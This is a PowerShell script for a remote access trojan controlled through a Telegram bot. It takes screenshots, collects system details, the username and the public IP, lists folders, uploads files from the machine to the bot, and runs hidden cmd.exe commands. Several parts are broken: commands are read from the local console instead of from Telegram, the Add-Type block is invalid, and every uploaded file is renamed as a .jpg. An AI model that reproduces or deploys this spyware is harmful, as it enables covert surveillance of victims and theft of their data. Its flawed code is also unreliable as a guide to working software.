# Import required modules
Add-Type -TypeDefinition @"
    using System;
    using System.IO;
    using System.Diagnostics;
    using System.Net;
    using System.Net.NetworkInformation;
    using System.Runtime.InteropServices;
"@

$cd = [System.Environment]::GetFolderPath('UserProfile')

# Define function to send messages
Function Send-Message {
    Param (
        [string]$text
    )
    $requestUri = "https://api.telegram.org/botYOUR-TOKEN/sendMessage?chat_id=YOUR-CHAT-ID&text=$text"
    Invoke-RestMethod -Uri $requestUri
}

# Define function to send photos
Function Send-Photo {
    Param (
        [string]$photoPath
    )
    $fileStream = [System.IO.File]::ReadAllBytes($photoPath)
    $requestUri = "https://api.telegram.org/botYOUR-TOKEN/sendPhoto"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Content-Type", "multipart/form-data")
    $webClient.UploadFile($requestUri, $photoPath)
}

# Define function to execute shell command
Function Execute-ShellCommand {
    Param (
        [string]$command
    )
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = "cmd.exe"
    $process.StartInfo.Arguments = "/c $command"
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true
    $process.Start()
    $output = $process.StandardOutput.ReadToEnd()
    $process.WaitForExit()
    return $output
}

# Define function to get IP address
Function Get-IpAddress {
    Try {
        $publicIp = (Invoke-WebRequest -Uri "https://api.ipify.org?format=text").Content
        Send-Message "Your public IP address is: $publicIp"
    }
    Catch {
        Send-Message "An error occurred while fetching the IP address."
    }
}

# Define function to get system information
Function Get-SystemInfo {
    $osInfo = [System.Environment]::OSVersion
    $osPlatform = [System.Environment]::Is64BitOperatingSystem ? "64-bit" : "32-bit"
    $cpuCores = [System.Environment]::ProcessorCount
    $username = [System.Environment]::UserName

    $systemInfo = @"
    Platform: $($osInfo.Platform)
    System: $($osInfo.VersionString)
    Node Name: $($env:COMPUTERNAME)
    Release: $($osInfo.Version)
    Version: $($osInfo.ServicePack)
    Machine: $($osInfo.OSArchitecture)
    Processor: $($env:PROCESSOR_IDENTIFIER)
    CPU Cores: $cpuCores
    Username: $username
"@
    Send-Message $systemInfo
}

# Define function to list directory contents
Function List-Directory {
    Try {
        $contents = Get-ChildItem -Path $cd
        If ($contents) {
            $response = "Directory content:`n"
            $contents | ForEach-Object {
                $response += "- $($_.Name)`n"
            }
            Send-Message $response
        }
        Else {
            Send-Message "The folder is empty."
        }
    }
    Catch {
        Send-Message "An error occurred: $_"
    }
}

# Define function to change directory
Function Change-Directory {
    Param (
        [string]$newDirectory
    )
    Try {
        $newPath = Join-Path -Path $cd -ChildPath $newDirectory
        If (Test-Path -Path $newPath -PathType Container) {
            $cd = $newPath
            Send-Message "You are now in: $cd"
        }
        Else {
            Send-Message "The directory does not exist."
        }
    }
    Catch {
        Send-Message "An error occurred: $_"
    }
}

# Define function to upload a file
Function Upload-File {
    Param (
        [string]$filePath
    )
    Try {
        If (Test-Path -Path $filePath -PathType Leaf) {
            Send-Message "Uploading file..."
            $photoPath = Join-Path -Path $cd -ChildPath "uploaded_file.jpg"
            Copy-Item -Path $filePath -Destination $photoPath -Force
            Send-Photo $photoPath
            Send-Message "File has been transferred successfully."
            Remove-Item -Path $photoPath -Force
        }
        Else {
            Send-Message "The specified file does not exist."
        }
    }
    Catch {
        Send-Message "An error occurred: $_"
    }
}

# Define function to execute shell commands
Function Shell {
    Try {
        Send-Message "You are now in the remote shell interface. Type 'exit' to exit."
        While ($true) {
            $input = Read-Host "PS >"
            If ($input -eq "exit") {
                Send-Message "Exiting remote shell interface."
                Break
            }
            $output = Execute-ShellCommand $input
            Send-Message "Command output:`n$output"
        }
    }
    Catch {
        Send-Message "An error occurred: $_"
    }
}

# Main function
Function Main {
    Try {
        Send-Message "Welcome! Send /screen to capture a screenshot, /sys to get system information, /ip to get IP address, /cd to navigate folders, /ls for directory contents, /upload [path] to upload a file, /shell for remote shell, and /exit to exit."
        While ($true) {
            $message = Read-Host
            Switch -Regex ($message) {
                "/screen" {
                    Send-Message "Capturing screenshot..."
                    $screenshotPath = Join-Path -Path $cd -ChildPath "capture.png"
                    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
                    $bitmap.Save($screenshotPath)
                    Send-Photo $screenshotPath
                    Remove-Item -Path $screenshotPath -Force
                    Send-Message "Screenshot sent successfully."
                }
                "/ip" {
                    Get-IpAddress
                }
                "/sys" {
                    Get-SystemInfo
                }
                "/ls" {
                    List-Directory
                }
                "/cd (.*)" {
                    Change-Directory $matches[1]
                }
                "/upload (.*)" {
                    Upload-File $matches[1]
                }
                "/shell" {
                    Shell
                }
                "/exit" {
                    Send-Message "Exiting the script."
                    Break
                }
                Default {
                    Send-Message "Invalid command. Please use one of the following commands: /screen, /sys, /ip, /cd, /ls, /upload, /shell, /exit."
                }
            }
        }
    }
    Catch {
        Send-Message "An error occurred: $_"
    }
}

Main
